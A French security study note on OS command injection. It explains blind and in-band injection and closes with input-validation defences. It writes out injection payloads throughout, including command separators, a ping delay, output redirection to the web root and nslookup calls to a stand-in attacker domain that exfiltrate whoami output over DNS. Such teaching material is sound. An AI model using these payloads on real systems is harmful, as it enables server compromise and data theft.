---
title: "4.Injection de commandes"
category: "Serveur"
tag: "Web"
---

## CheckList en pratique
- Injection avec retour d'information : `& whoami &` avec les différents séparateurs de commandes (`&, &&, |, ||, ;, \n, 0x0a`)
- Bind injection :
    - Détecter en provoquant du délai : `qsParam=test||ping+-c+10+127.0.0.1+||`
    - Exploitation en faire une redirection dans un dossier writable : `email=||whoami>/var/www/images/output.txt||`
    - Exploitation par injection utilisant des techniques **OAST** :
    ``&email=test||nslookup+kgji2ohoyw.web-attacker.com||`` 
    - Exploitation & **exfiltration de données** par injection utilisant des techniques **OAST** : 
    ``&email=test||nslookup+`whoami`.kgji2ohoyw.web-attacker.com||``

## Explication de la vulnérabilité
Cette vulnérabilité web permet à un attaquant d'exécuter une commande de système d'exploitation (OS) sur le serveur sur lequel l'application est exécutée, et compromettre toute l'application et ses données. Souvent, cette attaque amène à une exploitation de l'infrastructure hôte en pivotant sur d'autres systèmes de l'organisation.

## Exécution de commandes arbitraires
Considérons un site de magasin qui vérifie si un article est en stock de la manière suivante :
`https://insecure-website.com/stockStatus?productID=381&storeID=29`.
Pour fournir l'information et pour des raisons historiques, la fonctionnalité va appelé une commande shell avec le produit et son ID de la manière suivante :
`stockreport.pl 381 29`, et le retour est renvoyé à l'utilisateur.

Sans protection, l'attaquant peut injecter la commande suivante `& echo toto &` ce qui donnera `stockreport.pl & echo toto & 29`

## Commandes utiles

|Purpose of command|Linux|Windows|
|:----|:----|:----|
|Nom de l'utilisateur courant|whoami|whoami|
|système d'exploitation|uname -a|ver|
|configuration réseau|ifconfig|ipconfig /all|
|connections réseau|netstat -an|netstat -an|
|processus courants|ps -ef|tasklist|

## Vulnérabilités d'injection Blind de commandes OS
De nombreuses injections de commandes sont faites en aveugle, ce qui veut dire que l'application ne renvoie pas de sortie de la commande dans la réponse HTTP. On peut exploiter les vulnérabilités en aveugle, mais de différentes manières.

Pour illustrer cela, on peut prendre le cas d'une application qui permet de donner un feedback sur un site en donnant son adresse mail et le message de feedback. L'application du côté serveur génère un email vers l'administrateur du site contenant le feedback. 

Pour cela, il peut utiliser un programme `mail` avec les détails, par exemple :
`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`
### Détecter les injections de commandes OS en aveugle avec l'utilisation de délais
On peut utiliser une injection de commande qui va ajouter un temps de délai, nous permettant de voir que la commande a bien été injecté.
On peut faire ça avec `ping` par exemple, pour allonger le temps de traitement  :
`& ping -c 10 127.0.0.1 &`
Cette commande va ping son adresse réseau de loopback pendant 10 sec.

### Exploitation d'injections de commandes OS en aveugle par redirection de sortie
On peut rediriger la sortie de l'injection de commandes dans un fichier à l'intérieur de la racine du site web, que l'on peut récupérer avec le navigateur ensuite.

Par exemple, si l'application sert des ressources statiques à partir de l'emplacement du système de fichiers `/var/www/static`, vous pouvez soumettre l'entrée suivante :

`& whoami > /var/www/static/whoami.txt &`

### Exploitation d'injections de commandes OS en aveugle à l'aide de techniques hors bande (OAST)
On peut utiliser une commande injectée qui déclenchera une interaction réseau hors bande avec un système qu'on contrôle, en utilisant des techniques OAST.  
En voici un exemple :
`& nslookup kgji2ohoyw.web-attacker.com &`

Ce payload utilise la commande nslookup pour provoquer une recherche DNS pour le domaine spécifié. L'attaquant peut surveiller l'exécution de la recherche spécifiée et détecter ainsi que la commande a été injectée avec succès.

On peut aussi exfiltrer facilement la sortie de commandes avec cette technique :  
``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``  
ce qui provoquera une recherche DNS vers le domaine de l'attaquant contenant le résultat de la commande whoami :
`www.user.kgji2ohoyw.web-attacker.com`

## Façons d'injecter des commandes du système d'exploitation
De nombreux métacaractère du shell peuvent être utilisés pour effectuer des attaques par OS command injection.
On peut citer les caractères qui servent de séparateurs de commandes, permettant d'enchaîner les commandes.

Sous Windows et Unix on a par exemple :
- `&`
- `&&`
- `|`
- `||`

Sous les systèmes basés sur Unix :
- `;`
- `\n` ou `0x0a`
On a également la possibilité de faire des commandes de types inline :
- `` ` ``
- `$()`

## Comment s'en prémunir
La meilleure manière de s'en prémunir est de ne jamais appeler des commandes OS à partir d'un code provenant de la couche applicative. Il existe des alternatives sécurisées notamment avec des APIs.

S'il est inévitable de faire une commande OS avec une entrée utilisateur, alors une validation de l'entrée doit être faite, ce qui peut inclure :
- une validation à l'aide d'une liste blanche des valeurs autorisées.
- une validation si l'entrée doit être un caractère numérique.
- une validation des entrées alphanumériques, sans autoriser d'autres caractères comme les espaces ou autres.